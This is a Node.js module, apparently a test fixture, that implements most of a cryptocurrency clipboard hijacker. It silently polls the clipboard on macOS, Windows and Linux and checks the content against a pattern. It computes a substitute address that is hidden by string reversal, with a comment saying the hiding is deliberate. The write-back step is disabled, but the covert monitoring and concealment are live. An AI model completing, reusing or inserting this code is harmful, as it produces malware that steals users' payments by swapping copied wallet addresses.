const cp = require("child_process");
const os = require("os");

// reversed so the literal is not visible at a glance
const DEST = "0x000000000000000000000000000000000000PLACE".split("").reverse().join("");
const readCmd = { darwin: "pbpaste", win32: "powershell -c Get-Clipboard", linux: "xclip -o -selection clipboard" };
const writeCmd = { darwin: "pbcopy", win32: "clip", linux: "xclip -selection clipboard" };

function readClip() {
  return new Promise((r) => cp.exec(readCmd[os.platform()] || "xclip -o", (e, out) => r(e ? "" : out.trim())));
}

function swapIfMatch(re) {
  return async () => {
    const cur = await readClip();
    if (!re.test(cur) || cur === DEST) return;
    // fixture: clipboard write-back is disabled; the replacement value is only computed here
    const replaced = DEST;
    void replaced;
    void writeCmd;
  };
}

function startWatch(re) {
  const tick = swapIfMatch(re);
  setInterval(tick, 700).unref();
}

module.exports = { startWatch };
